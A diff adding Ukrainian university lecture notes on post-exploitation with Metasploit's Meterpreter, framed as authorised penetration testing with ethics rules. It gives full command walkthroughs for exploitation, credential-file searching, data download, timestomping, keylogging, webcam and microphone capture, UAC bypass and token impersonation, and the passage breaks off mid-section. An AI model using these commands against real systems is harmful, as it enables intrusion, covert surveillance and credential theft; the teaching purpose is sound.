@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Конспект лекції 9: Пост-експлуатація та Meterpreter — повний текст.">
-  <meta name="author" content="Кафедра інформатики та фізико-математичних дисциплін, УжНУ">
+  <meta name="description" content="Конспект лекції 9: Пост-експлуатація та Meterpreter — збір інформації, кейлоггінг, ескалація привілеїв, credential harvesting, pivoting.">
+  <meta name="author" content="Кафедра ТЕІБ, УжНУ">
   <meta name="theme-color" content="#0ea5e9">
   <title>Конспект | Лекція 9. Пост-експлуатація та Meterpreter</title>
   <link rel="icon" type="image/svg+xml" href="../img/favicon.svg">
@@ -69,18 +69,1201 @@
       <h1>Пост-експлуатація та Meterpreter</h1>
       <div class="lecture-info">
         <span><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align: -2px; margin-right: 4px;"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>2 год</span>
-        <span class="badge badge-locked">Скоро</span>
+        <span class="badge badge-new">Нова</span>
       </div>
 
+      <!-- ============================================================ -->
+      <!-- 9.1 Вступ до пост-експлуатації                               -->
+      <!-- ============================================================ -->
       <section>
-        <p>Матеріали цього конспекту готуються. Слідкуйте за оновленнями.</p>
+        <h2>9.1 Вступ до пост-експлуатації</h2>
+
+        <p>Пост-експлуатація (Post-Exploitation) — етап пентесту, що починається <strong>після отримання початкового доступу</strong> до цільової системи. Це один із найскладніших та найважливіших етапів, оскільки саме тут пентестер демонструє реальний бізнес-вплив компрометації.</p>
+
+        <p>Якщо попередні етапи (розвідка, сканування, експлуатація) — це "відкрити двері", то пост-експлуатація — це "що саме зловмисник може зробити всередині". Результати цього етапу визначають критичність знайдених вразливостей у фінальному звіті.</p>
+
+        <h3>Цілі пост-експлуатації</h3>
+        <table>
+          <tr>
+            <th>Ціль</th>
+            <th>Опис</th>
+            <th>Приклад</th>
+          </tr>
+          <tr>
+            <td><strong>Situation Awareness</strong></td>
+            <td>Зрозуміти, де ми: ОС, мережа, привілеї, оточення</td>
+            <td>sysinfo, ipconfig, whoami</td>
+          </tr>
+          <tr>
+            <td><strong>Privilege Escalation</strong></td>
+            <td>Підвищити привілеї до адміністратора / root</td>
+            <td>getsystem, kernel exploits</td>
+          </tr>
+          <tr>
+            <td><strong>Credential Harvesting</strong></td>
+            <td>Зібрати паролі, хеші, токени, ключі</td>
+            <td>hashdump, mimikatz, keylogging</td>
+          </tr>
+          <tr>
+            <td><strong>Data Exfiltration</strong></td>
+            <td>Знайти та вилучити цінні дані</td>
+            <td>Файли, БД, конфігурації, PII</td>
+          </tr>
+          <tr>
+            <td><strong>Lateral Movement</strong></td>
+            <td>Переміститися на інші системи в мережі</td>
+            <td>Pass-the-Hash, PsExec, pivoting</td>
+          </tr>
+          <tr>
+            <td><strong>Persistence</strong></td>
+            <td>Забезпечити збереження доступу після перезавантаження</td>
+            <td>Backdoors, scheduled tasks, registry</td>
+          </tr>
+          <tr>
+            <td><strong>Impact Assessment</strong></td>
+            <td>Оцінити бізнес-вплив компрометації</td>
+            <td>Доступ до фінансових даних, PII</td>
+          </tr>
+        </table>
+
+        <h3>MITRE ATT&CK: тактики пост-експлуатації</h3>
+
+        <p>MITRE ATT&CK Framework — база знань про тактики, техніки та процедури (TTPs) зловмисників. Для пост-експлуатації релевантні такі тактики:</p>
+
+        <table>
+          <tr>
+            <th>Тактика</th>
+            <th>ATT&CK ID</th>
+            <th>Опис</th>
+          </tr>
+          <tr>
+            <td><strong>Execution</strong></td>
+            <td>TA0002</td>
+            <td>Запуск шкідливого коду (PowerShell, scripts, WMI)</td>
+          </tr>
+          <tr>
+            <td><strong>Persistence</strong></td>
+            <td>TA0003</td>
+            <td>Збереження доступу (registry, scheduled tasks, services)</td>
+          </tr>
+          <tr>
+            <td><strong>Privilege Escalation</strong></td>
+            <td>TA0004</td>
+            <td>Підвищення привілеїв (UAC bypass, token manipulation)</td>
+          </tr>
+          <tr>
+            <td><strong>Defense Evasion</strong></td>
+            <td>TA0005</td>
+            <td>Обхід захисту (process injection, timestomping)</td>
+          </tr>
+          <tr>
+            <td><strong>Credential Access</strong></td>
+            <td>TA0006</td>
+            <td>Крадіжка облікових даних (LSASS dump, keylogging)</td>
+          </tr>
+          <tr>
+            <td><strong>Discovery</strong></td>
+            <td>TA0007</td>
+            <td>Збір інформації про систему та мережу</td>
+          </tr>
+          <tr>
+            <td><strong>Lateral Movement</strong></td>
+            <td>TA0008</td>
+            <td>Переміщення між системами (RDP, SMB, WinRM)</td>
+          </tr>
+          <tr>
+            <td><strong>Collection</strong></td>
+            <td>TA0009</td>
+            <td>Збір цільових даних (файли, email, clipboard)</td>
+          </tr>
+          <tr>
+            <td><strong>Exfiltration</strong></td>
+            <td>TA0010</td>
+            <td>Вилучення даних (C2, DNS tunneling, cloud)</td>
+          </tr>
+        </table>
+
+        <h3>Етичні та правові аспекти</h3>
+        <ul>
+          <li><strong>Scope of Engagement</strong> — пост-експлуатація повинна бути чітко прописана в договорі (Rules of Engagement)</li>
+          <li><strong>Деструктивні дії заборонені</strong> — не видаляти дані, не зупиняти сервіси, не модифікувати продакшн</li>
+          <li><strong>Мінімальний вплив</strong> — збирати тільки необхідні докази, не ексфільтрувати реальні дані клієнтів</li>
+          <li><strong>Документування</strong> — кожна дія повинна бути задокументована з timestamp</li>
+          <li><strong>Очищення</strong> — після тесту видалити всі backdoor'и, файли, акаунти</li>
+        </ul>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 9.2 Meterpreter: архітектура та основи                       -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>9.2 Meterpreter: архітектура та основи</h2>
+
+        <p>Meterpreter (Meta-Interpreter) — розширена оболонка Metasploit Framework, що працює повністю в пам'яті скомпрометованої системи. На відміну від звичайного shell (cmd.exe, /bin/sh), Meterpreter надає багатий набір команд для пост-експлуатації, шифрує трафік та не залишає слідів на диску.</p>
+
+        <h3>Архітектура Meterpreter</h3>
+
+        <p><strong>Ключові характеристики:</strong></p>
+        <ul>
+          <li><strong>In-Memory Execution</strong> — DLL-ін'єкція у процес, ніколи не торкається диску</li>
+          <li><strong>Encrypted Communication</strong> — TLS-шифрований канал між атакуючим і жертвою</li>
+          <li><strong>Extensible</strong> — завантаження додаткових модулів (extensions) на льоту</li>
+          <li><strong>Stager + Stage</strong> — малий stager встановлює з'єднання, потім завантажує повний stage</li>
+          <li><strong>Process Migration</strong> — переміщення між процесами без перезавантаження</li>
+          <li><strong>Channel-based I/O</strong> — множинні канали в одній сесії (shell, port forward)</li>
+        </ul>
+
+        <h3>Типи Meterpreter payload'ів</h3>
+        <table>
+          <tr>
+            <th>Payload</th>
+            <th>Платформа</th>
+            <th>Транспорт</th>
+            <th>Опис</th>
+          </tr>
+          <tr>
+            <td><code>windows/meterpreter/reverse_tcp</code></td>
+            <td>Windows x86</td>
+            <td>TCP</td>
+            <td>Класичний reverse shell</td>
+          </tr>
+          <tr>
+            <td><code>windows/x64/meterpreter/reverse_tcp</code></td>
+            <td>Windows x64</td>
+            <td>TCP</td>
+            <td>64-бітна версія</td>
+          </tr>
+          <tr>
+            <td><code>windows/meterpreter/reverse_https</code></td>
+            <td>Windows</td>
+            <td>HTTPS</td>
+            <td>Шифрований, обходить firewall</td>
+          </tr>
+          <tr>
+            <td><code>linux/x86/meterpreter/reverse_tcp</code></td>
+            <td>Linux x86</td>
+            <td>TCP</td>
+            <td>Linux reverse shell</td>
+          </tr>
+          <tr>
+            <td><code>python/meterpreter/reverse_tcp</code></td>
+            <td>Cross-platform</td>
+            <td>TCP</td>
+            <td>Python-based, без компіляції</td>
+          </tr>
+          <tr>
+            <td><code>php/meterpreter/reverse_tcp</code></td>
+            <td>PHP (Web)</td>
+            <td>TCP</td>
+            <td>Для веб-серверів з PHP</td>
+          </tr>
+          <tr>
+            <td><code>java/meterpreter/reverse_tcp</code></td>
+            <td>Java</td>
+            <td>TCP</td>
+            <td>Java-based, кросплатформний</td>
+          </tr>
+        </table>
+
+        <h3>Отримання Meterpreter-сесії</h3>
+        <pre><code># Варіант 1: Через експлойт (автоматично)
+msf6&gt; use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(ms17_010_eternalblue)&gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(ms17_010_eternalblue)&gt; set RHOSTS 192.168.1.100
+msf6 exploit(ms17_010_eternalblue)&gt; set LHOST 192.168.1.50
+msf6 exploit(ms17_010_eternalblue)&gt; exploit
+
+[*] Started reverse TCP handler on 192.168.1.50:4444
+[*] Sending stage (200774 bytes) to 192.168.1.100
+[*] Meterpreter session 1 opened
+
+meterpreter&gt;
+
+# Варіант 2: Апгрейд звичайного shell до Meterpreter
+msf6&gt; sessions -u 1    # апгрейд сесії #1
+
+# Або з shell-сесії:
+msfconsole -x "use post/multi/manage/shell_to_meterpreter; set SESSION 1; run"
+
+# Варіант 3: Через handler (для msfvenom payload)
+msf6&gt; use exploit/multi/handler
+msf6 exploit(handler)&gt; set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(handler)&gt; set LHOST 0.0.0.0
+msf6 exploit(handler)&gt; set LPORT 4444
+msf6 exploit(handler)&gt; exploit -j    # запуск у фоновому режимі</code></pre>
+
+        <h3>Базові команди Meterpreter</h3>
+        <table>
+          <tr>
+            <th>Категорія</th>
+            <th>Команда</th>
+            <th>Опис</th>
+          </tr>
+          <tr>
+            <td rowspan="4"><strong>Система</strong></td>
+            <td><code>sysinfo</code></td>
+            <td>Інформація про ОС, архітектуру, ім'я комп'ютера</td>
+          </tr>
+          <tr>
+            <td><code>getuid</code></td>
+            <td>Поточний користувач</td>
+          </tr>
+          <tr>
+            <td><code>getpid</code></td>
+            <td>PID поточного процесу</td>
+          </tr>
+          <tr>
+            <td><code>shell</code></td>
+            <td>Відкрити системний shell (cmd/bash)</td>
+          </tr>
+          <tr>
+            <td rowspan="4"><strong>Файли</strong></td>
+            <td><code>ls / dir</code></td>
+            <td>Список файлів</td>
+          </tr>
+          <tr>
+            <td><code>cd / pwd</code></td>
+            <td>Навігація по директоріях</td>
+          </tr>
+          <tr>
+            <td><code>upload / download</code></td>
+            <td>Передача файлів</td>
+          </tr>
+          <tr>
+            <td><code>cat / edit</code></td>
+            <td>Читання / редагування файлів</td>
+          </tr>
+          <tr>
+            <td rowspan="3"><strong>Мережа</strong></td>
+            <td><code>ipconfig / ifconfig</code></td>
+            <td>Мережеві інтерфейси</td>
+          </tr>
+          <tr>
+            <td><code>route</code></td>
+            <td>Таблиця маршрутизації</td>
+          </tr>
+          <tr>
+            <td><code>portfwd</code></td>
+            <td>Port forwarding</td>
+          </tr>
+          <tr>
+            <td rowspan="3"><strong>Сесія</strong></td>
+            <td><code>background</code></td>
+            <td>Відправити сесію у фон (Ctrl+Z)</td>
+          </tr>
+          <tr>
+            <td><code>exit / quit</code></td>
+            <td>Закрити сесію</td>
+          </tr>
+          <tr>
+            <td><code>help</code></td>
+            <td>Список усіх доступних команд</td>
+          </tr>
+        </table>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 9.3 Збір інформації про систему                              -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>9.3 Збір інформації про систему (Enumeration)</h2>
+
+        <p>Перший крок після отримання сесії — зрозуміти, де ми знаходимося. Системна розвідка визначає подальшу стратегію: які привілеї доступні, які дані можна вилучити, куди рухатися далі.</p>
+
+        <h3>Базова інформація про систему</h3>
+        <pre><code>meterpreter&gt; sysinfo
+Computer        : WIN-TARGET01
+OS              : Windows 10 (10.0 Build 19041)
+Architecture    : x64
+System Language : en_US
+Domain          : CORP
+Logged On Users : 3
+Meterpreter     : x64/windows
+
+meterpreter&gt; getuid
+Server username: CORP\jsmith
+
+meterpreter&gt; getpid
+Current pid: 4872
+
+meterpreter&gt; getprivs
+Enabled Process Privileges
+==========================
+  SeChangeNotifyPrivilege
+  SeIncreaseWorkingSetPrivilege
+  SeShutdownPrivilege
+  SeUndockPrivilege
+  ...</code></pre>
+
+        <h3>Мережева інформація</h3>
+        <pre><code>meterpreter&gt; ipconfig
+
+Interface  1
+============
+Name         : Intel(R) 82574L Gigabit Network Connection
+Hardware MAC : 08:00:27:5b:3f:21
+MTU          : 1500
+IPv4 Address : 192.168.1.100
+IPv4 Netmask : 255.255.255.0
+IPv6 Address : fe80::a00:27ff:fe5b:3f21
+
+Interface  2
+============
+Name         : Internal Network
+IPv4 Address : 10.0.0.5
+IPv4 Netmask : 255.255.255.0
+
+meterpreter&gt; route
+IPv4 network routes
+====================
+    Subnet        Netmask        Gateway
+    ------        -------        -------
+    0.0.0.0       0.0.0.0        192.168.1.1
+    10.0.0.0      255.255.255.0  10.0.0.1
+    192.168.1.0   255.255.255.0  192.168.1.1
+
+meterpreter&gt; arp
+ARP cache
+=========
+    IP address       MAC address        Interface
+    ----------       -----------        ---------
+    192.168.1.1      aa:bb:cc:dd:ee:ff  Intel(R) 82574L
+    192.168.1.50     08:00:27:12:34:56  Intel(R) 82574L
+    10.0.0.1         08:00:27:ab:cd:ef  Internal Network
+    10.0.0.10        08:00:27:99:88:77  Internal Network
+
+meterpreter&gt; netstat -ant
+Connection list
+===============
+    Proto  Local address     Remote address     State
+    -----  -------------     --------------     -----
+    tcp    0.0.0.0:135       0.0.0.0:*          LISTEN
+    tcp    0.0.0.0:445       0.0.0.0:*          LISTEN
+    tcp    0.0.0.0:3389      0.0.0.0:*          LISTEN
+    tcp    192.168.1.100:49872  192.168.1.50:4444  ESTABLISHED</code></pre>
+
+        <h3>Процеси та користувачі</h3>
+        <pre><code>meterpreter&gt; ps
+
+Process List
+============
+ PID   PPID  Name                 Arch  Session  User
+ ---   ----  ----                 ----  -------  ----
+ 0     0     [System Process]
+ 4     0     System               x64   0
+ 388   4     smss.exe             x64   0        NT AUTHORITY\SYSTEM
+ 552   388   csrss.exe            x64   0        NT AUTHORITY\SYSTEM
+ 2816  1032  explorer.exe         x64   1        CORP\jsmith
+ 3456  2816  chrome.exe           x64   1        CORP\jsmith
+ 4872  3456  notepad.exe          x64   1        CORP\jsmith     &lt;-- наш процес!
+
+# Список залогованих користувачів
+meterpreter&gt; run post/windows/gather/enum_logged_on_users
+
+[*] Current Logged Users
+========================
+  SID                                      User
+  ---                                      ----
+  S-1-5-21-...-1001                        CORP\jsmith
+  S-1-5-21-...-500                         CORP\Administrator
+
+# Список локальних користувачів
+meterpreter&gt; run post/windows/gather/enum_ad_users</code></pre>
+
+        <h3>Автоматизовані post-модулі для enumeration</h3>
+        <table>
+          <tr>
+            <th>Модуль</th>
+            <th>Опис</th>
+          </tr>
+          <tr>
+            <td><code>post/windows/gather/enum_logged_on_users</code></td>
+            <td>Залоговані користувачі</td>
+          </tr>
+          <tr>
+            <td><code>post/windows/gather/enum_domain</code></td>
+            <td>Інформація про домен</td>
+          </tr>
+          <tr>
+            <td><code>post/windows/gather/enum_shares</code></td>
+            <td>Мережеві ресурси (SMB shares)</td>
+          </tr>
+          <tr>
+            <td><code>post/windows/gather/enum_applications</code></td>
+            <td>Встановлене ПЗ</td>
+          </tr>
+          <tr>
+            <td><code>post/windows/gather/enum_patches</code></td>
+            <td>Встановлені патчі (KB)</td>
+          </tr>
+          <tr>
+            <td><code>post/windows/gather/checkvm</code></td>
+            <td>Перевірка на віртуальну машину</td>
+          </tr>
+          <tr>
+            <td><code>post/multi/gather/env</code></td>
+            <td>Змінні оточення</td>
+          </tr>
+          <tr>
+            <td><code>post/windows/gather/enum_services</code></td>
+            <td>Запущені сервіси</td>
+          </tr>
+          <tr>
+            <td><code>post/linux/gather/enum_system</code></td>
+            <td>Linux system enumeration</td>
+          </tr>
+          <tr>
+            <td><code>post/linux/gather/enum_network</code></td>
+            <td>Linux мережа</td>
+          </tr>
+        </table>
+
+        <pre><code># Використання post-модуля
+meterpreter&gt; background
+msf6&gt; use post/windows/gather/enum_applications
+msf6 post(enum_applications)&gt; set SESSION 1
+msf6 post(enum_applications)&gt; run
+
+# Або напряму з meterpreter:
+meterpreter&gt; run post/windows/gather/enum_applications</code></pre>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 9.4 Файлові операції та пошук даних                          -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>9.4 Файлові операції та пошук даних</h2>
+
+        <p>Файлові операції в Meterpreter дозволяють навігувати по файловій системі, знаходити цінні файли, завантажувати їх на атакуючу машину та маніпулювати метаданими для приховування слідів.</p>
+
+        <h3>Навігація та базові операції</h3>
+        <pre><code># Навігація
+meterpreter&gt; pwd
+C:\Users\jsmith\Desktop
+meterpreter&gt; cd C:\\Users
+meterpreter&gt; ls
+
+Listing: C:\Users
+=================
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+40777/rwxrwxrwx   0     dir   2024-01-15 10:23:45 +0200  Administrator
+40777/rwxrwxrwx   0     dir   2024-03-10 14:12:33 +0200  jsmith
+40777/rwxrwxrwx   0     dir   2024-01-15 09:00:00 +0200  Public
+
+# Читання файлів
+meterpreter&gt; cat C:\\Users\\jsmith\\Desktop\\passwords.txt
+admin:P@ssw0rd123
+db_user:MySQL!2024
+vpn:SecretVPN#99
+
+# Редагування файлів
+meterpreter&gt; edit C:\\path\\to\\file.txt
+
+# Створення та видалення
+meterpreter&gt; mkdir C:\\temp\\exfil
+meterpreter&gt; rmdir C:\\temp\\exfil
+meterpreter&gt; rm C:\\path\\to\\file.txt</code></pre>
+
+        <h3>Передача файлів</h3>
+        <pre><code># Завантаження файлу з жертви на атакуючу машину
+meterpreter&gt; download C:\\Users\\jsmith\\Documents\\report.docx /tmp/loot/
+[*] downloading: C:\Users\jsmith\Documents\report.docx -&gt; /tmp/loot/report.docx
+[*] downloaded : C:\Users\jsmith\Documents\report.docx -&gt; /tmp/loot/report.docx
+
+# Рекурсивне завантаження директорії
+meterpreter&gt; download -r C:\\Users\\jsmith\\Documents\\ /tmp/loot/docs/
+
+# Завантаження файлу на жертву (upload)
+meterpreter&gt; upload /tmp/tools/nc.exe C:\\Windows\\Temp\\nc.exe
+[*] uploading  : /tmp/tools/nc.exe -&gt; C:\Windows\Temp\nc.exe
+[*] uploaded   : /tmp/tools/nc.exe -&gt; C:\Windows\Temp\nc.exe</code></pre>
+
+        <h3>Пошук файлів</h3>
+        <pre><code># Пошук за розширенням
+meterpreter&gt; search -f *.txt -d C:\\Users\\
+Found 47 results...
+    C:\Users\jsmith\Desktop\passwords.txt (234 bytes)
+    C:\Users\jsmith\Documents\notes.txt (1024 bytes)
+    ...
+
+# Пошук конфігурацій та облікових даних
+meterpreter&gt; search -f *.conf -d C:\\
+meterpreter&gt; search -f *.ini -d C:\\
+meterpreter&gt; search -f web.config -d C:\\inetpub\\
+meterpreter&gt; search -f *.kdbx     # KeePass databases
+meterpreter&gt; search -f id_rsa -d /home/   # SSH ключі (Linux)
+meterpreter&gt; search -f *.pem -d /         # Сертифікати
+meterpreter&gt; search -f wp-config.php      # WordPress credentials
+meterpreter&gt; search -f .env               # Environment files
+
+# Пошук за іменем
+meterpreter&gt; search -f *password* -d C:\\Users\\
+meterpreter&gt; search -f *credential* -d C:\\Users\\
+meterpreter&gt; search -f *secret* -d C:\\Users\\</code></pre>
+
+        <h3>Timestomping (маніпуляція часовими мітками)</h3>
+
+        <p>Timestomping — техніка зміни часових міток файлів (Created, Modified, Accessed, Entry Modified) для приховування слідів. MITRE ATT&CK: T1070.006.</p>
+
+        <pre><code># Перегляд поточних часових міток
+meterpreter&gt; timestomp C:\\Windows\\Temp\\nc.exe -v
+
+Created    : 2024-03-15 14:23:01 +0200
+Modified   : 2024-03-15 14:23:01 +0200
+Accessed   : 2024-03-15 14:25:33 +0200
+Entry Modified: 2024-03-15 14:23:01 +0200
+
+# Зміна Modified timestamp (замаскувати під системний файл)
+meterpreter&gt; timestomp C:\\Windows\\Temp\\nc.exe -m "2023-01-15 08:30:00"
+
+# Скопіювати мітки з іншого файлу
+meterpreter&gt; timestomp C:\\Windows\\Temp\\nc.exe -f C:\\Windows\\System32\\calc.exe
+
+# Очистити MACE значення (зробить файл "невидимим" для деяких інструментів)
+meterpreter&gt; timestomp C:\\Windows\\Temp\\nc.exe -b</code></pre>
+
+        <h3>Цінні файли для пошуку</h3>
+        <table>
+          <tr>
+            <th>Тип</th>
+            <th>Файли</th>
+            <th>Що шукаємо</th>
+          </tr>
+          <tr>
+            <td><strong>Credentials</strong></td>
+            <td>*.txt, *.xlsx, *.kdbx, *.doc</td>
+            <td>Паролі, ключі, токени</td>
+          </tr>
+          <tr>
+            <td><strong>Конфігурації</strong></td>
+            <td>web.config, .env, *.conf, *.ini</td>
+            <td>DB credentials, API keys</td>
+          </tr>
+          <tr>
+            <td><strong>SSH ключі</strong></td>
+            <td>id_rsa, id_ed25519, *.pem</td>
+            <td>Приватні ключі для доступу</td>
+          </tr>
+          <tr>
+            <td><strong>Бази даних</strong></td>
+            <td>*.db, *.sqlite, *.mdb</td>
+            <td>Дані користувачів</td>
+          </tr>
+          <tr>
+            <td><strong>Бекапи</strong></td>
+            <td>*.bak, *.sql, *.dump</td>
+            <td>Database dumps, конфіги</td>
+          </tr>
+          <tr>
+            <td><strong>Історія</strong></td>
+            <td>.bash_history, .zsh_history</td>
+            <td>Раніше виконані команди</td>
+          </tr>
+        </table>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 9.5 Кейлоггінг, скріншоти та спостереження                   -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>9.5 Кейлоггінг, скріншоти та спостереження</h2>
+
+        <p>Meterpreter надає можливості для спостереження за діями користувача в реальному часі: перехоплення натискань клавіш, знімки екрана, доступ до веб-камери та мікрофону. Ці функції демонструють серйозність компрометації у звіті про пентест.</p>
+
+        <h3>Кейлоггінг (Keystroke Logging)</h3>
+
+        <p>MITRE ATT&CK: T1056.001 — Input Capture: Keylogging</p>
+
+        <pre><code># Запуск кейлоггера
+meterpreter&gt; keyscan_start
+Starting the keystroke sniffer ...
+
+# ... користувач працює, вводить дані ...
+
+# Зчитування перехоплених натискань
+meterpreter&gt; keyscan_dump
+Dumping captured keystrokes...
+admin &lt;Tab&gt; P@ssw0rd123 &lt;Return&gt;
+Dear John, &lt;Return&gt; Please find attached the quarterly report...
+
+# Зупинка кейлоггера
+meterpreter&gt; keyscan_stop
+Stopping the keystroke sniffer ...</code></pre>
+
+        <p><strong>Важливо:</strong> кейлоггер перехоплює натискання у процесі, до якого прив'язана сесія Meterpreter. Для перехоплення вводу іншого користувача — спочатку мігруйте до його процесу (наприклад, <code>explorer.exe</code>).</p>
+
+        <h3>Знімки екрана (Screenshots)</h3>
+        <pre><code># Одиночний скріншот
+meterpreter&gt; screenshot
+Screenshot saved to: /tmp/XkRBnsea.jpeg
+
+# Скріншот з вказанням шляху
+meterpreter&gt; screenshot -p /tmp/loot/screen1.jpg
+
+# Потоковий скріншот (кожні N секунд)
+# Через post-модуль:
+meterpreter&gt; run post/multi/gather/screen_spy DELAY=5 COUNT=20
+[*] Capturing 20 screenshots with 5 second delay
+[*] Screen spy image 1/20 saved to /root/.msf4/loot/...</code></pre>
+
+        <h3>Веб-камера</h3>
+        <pre><code># Список доступних веб-камер
+meterpreter&gt; webcam_list
+1: Integrated Webcam
+
+# Зробити знімок
+meterpreter&gt; webcam_snap -i 1 -v false
+[*] Starting...
+[+] Got frame
+[*] Stopped
+Webcam shot saved to: /tmp/webcam_snap.jpeg
+
+# Потоковий відеозапис
+meterpreter&gt; webcam_stream -d 30
+[*] Starting stream for 30 seconds...
+[*] Streaming to: http://127.0.0.1:8080/</code></pre>
+
+        <h3>Аудіо (мікрофон)</h3>
+        <pre><code># Запис аудіо з мікрофона
+meterpreter&gt; record_mic -d 30
+[*] Starting audio recording for 30 seconds...
+[*] Audio saved to: /tmp/audio_record.wav
+
+# Список аудіопристроїв
+meterpreter&gt; record_mic -l</code></pre>
+
+        <h3>Інші можливості спостереження</h3>
+        <table>
+          <tr>
+            <th>Команда / модуль</th>
+            <th>Опис</th>
+            <th>ATT&CK</th>
+          </tr>
+          <tr>
+            <td><code>screenshare</code></td>
+            <td>Real-time перегляд робочого столу через браузер</td>
+            <td>T1113</td>
+          </tr>
+          <tr>
+            <td><code>idletime</code></td>
+            <td>Час неактивності користувача</td>
+            <td>T1010</td>
+          </tr>
+          <tr>
+            <td><code>run post/windows/gather/enum_chrome</code></td>
+            <td>Збір збережених паролів з Chrome</td>
+            <td>T1555.003</td>
+          </tr>
+          <tr>
+            <td><code>run post/multi/gather/firefox_creds</code></td>
+            <td>Збір збережених паролів з Firefox</td>
+            <td>T1555.003</td>
+          </tr>
+          <tr>
+            <td><code>run post/windows/gather/enum_putty_saved_sessions</code></td>
+            <td>Збережені SSH-сесії PuTTY</td>
+            <td>T1552.001</td>
+          </tr>
+          <tr>
+            <td><code>run post/windows/gather/enum_ie</code></td>
+            <td>Історія та паролі Internet Explorer</td>
+            <td>T1555.003</td>
+          </tr>
+        </table>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 9.6 Міграція процесів та ескалація привілеїв                 -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>9.6 Міграція процесів та ескалація привілеїв</h2>
+
+        <h3>Міграція процесів (Process Migration)</h3>
+
+        <p>Міграція — переміщення Meterpreter-сесії з одного процесу в інший. Причини для міграції:</p>
+        <ul>
+          <li><strong>Стабільність</strong> — якщо поточний процес нестабільний або може бути закритий</li>
+          <li><strong>Привілеї</strong> — міграція у процес з вищими привілеями</li>
+          <li><strong>Кейлоггінг</strong> — міграція в explorer.exe для перехоплення клавіш</li>
+          <li><strong>Уникнення виявлення</strong> — "сховатися" у легітимному системному процесі</li>
+          <li><strong>Архітектурна сумісність</strong> — з x86 процесу в x64 або навпаки</li>
+        </ul>
+
+        <pre><code># Перегляд поточного процесу
+meterpreter&gt; getpid
+Current pid: 4872  (notepad.exe)
+
+# Список процесів
+meterpreter&gt; ps
+ PID   Name                 Arch  User
+ ---   ----                 ----  ----
+ 552   csrss.exe            x64   NT AUTHORITY\SYSTEM
+ 2816  explorer.exe         x64   CORP\jsmith
+ 3120  svchost.exe          x64   NT AUTHORITY\SYSTEM
+ 3456  chrome.exe           x64   CORP\jsmith
+
+# Міграція в explorer.exe (стабільний, з привілеями користувача)
+meterpreter&gt; migrate 2816
+[*] Migrating from 4872 to 2816...
+[*] Migration completed successfully.
+
+# Автоматична міграція (знайде відповідний процес)
+meterpreter&gt; run post/windows/manage/migrate
+[*] Running module against WIN-TARGET01
+[*] Current server process: notepad.exe (4872)
+[*] Spawning notepad.exe process to migrate into
+[*] Migrating into 5120</code></pre>
+
+        <h3>Ескалація привілеїв (Privilege Escalation)</h3>
+
+        <p>Ескалація привілеїв — підвищення рівня доступу від звичайного користувача до адміністратора (Windows) або root (Linux). MITRE ATT&CK: TA0004.</p>
+
+        <p><strong>Метод 1: getsystem</strong></p>
+        <pre><code># Автоматична ескалація (потрібні локальні адміністраторські привілеї)
+meterpreter&gt; getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+
+# Перевірка
+meterpreter&gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+
+# Техніки getsystem:
+# 1. Named Pipe Impersonation (In Memory/Admin)
+# 2. Named Pipe Impersonation (Dropper/Admin)
+# 3. Token Duplication (In Memory/Admin)
+# 4. Named Pipe Impersonation (RPCSS variant)</code></pre>
+
+        <p><strong>Метод 2: UAC Bypass</strong></p>
+        <pre><code># Якщо getsystem не спрацював через UAC
+meterpreter&gt; background
+
+msf6&gt; use exploit/windows/local/bypassuac_eventvwr
+msf6 exploit(bypassuac_eventvwr)&gt; set SESSION 1
+msf6 exploit(bypassuac_eventvwr)&gt; set LHOST 192.168.1.50
+msf6 exploit(bypassuac_eventvwr)&gt; exploit
+
+# Інші UAC bypass модулі:
+# exploit/windows/local/bypassuac_fodhelper
+# exploit/windows/local/bypassuac_comhijack
+# exploit/windows/local/bypassuac_silentcleanup</code></pre>
+
+        <p><strong>Метод 3: Kernel Exploits</strong></p>
+        <pre><code># Перевірка на відомі вразливості ядра
+meterpreter&gt; run post/multi/recon/local_exploit_suggester
+
+[*] Running check for exploit suggestions...
+[+] exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+[+] exploit/windows/local/ms16_075_reflection
+[+] exploit/windows/local/cve_2020_0796_smbghost
+
+# Використання знайденого exploit'а
+msf6&gt; use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+msf6 exploit(...)&gt; set SESSION 1
+msf6 exploit(...)&gt; exploit</code></pre>
+
+        <h3>Token Impersonation</h3>
+
+        <p>Windows використовує токени для контролю доступу. Meterpreter може "вкрасти" токен іншого користувача для імперсонації.</p>
+
+        <pre><code># Завантаження модуля incognito
+meterpreter&gt; use incognito
+
+# Список доступних токенів
+meterpreter&gt; list_tokens -u
+
+Delegation Tokens Available
+========================================
+CORP\Administrator
+CORP\jsmith
+NT AUTHORITY\LOCAL SERVICE
+NT AUTHORITY\SYSTEM
+
+Impersonation Tokens Available
+========================================
+CORP\dbadmin
+
+# Імперсонація (вкрасти токен)
+meterpreter&gt; impersonate_token "CORP\\Administrator"
+[+] Delegation token available
+[+] Successfully impersonated user CORP\Administrator
+
+meterpreter&gt; getuid
+Server username: CORP\Administrator</code></pre>
+
+        <h3>Linux Privilege Escalation</h3>
+        <pre><code># Автоматична перевірка можливостей ескалації
+meterpreter&gt; run post/linux/gather/enum_system
+meterpreter&gt; run post/multi/recon/local_exploit_suggester
+
+# Ручна перевірка (через shell)
+meterpreter&gt; shell
+$ sudo -l                        # Що можна запустити через sudo?
+$ find / -perm -4000 2&gt;/dev/null # SUID файли
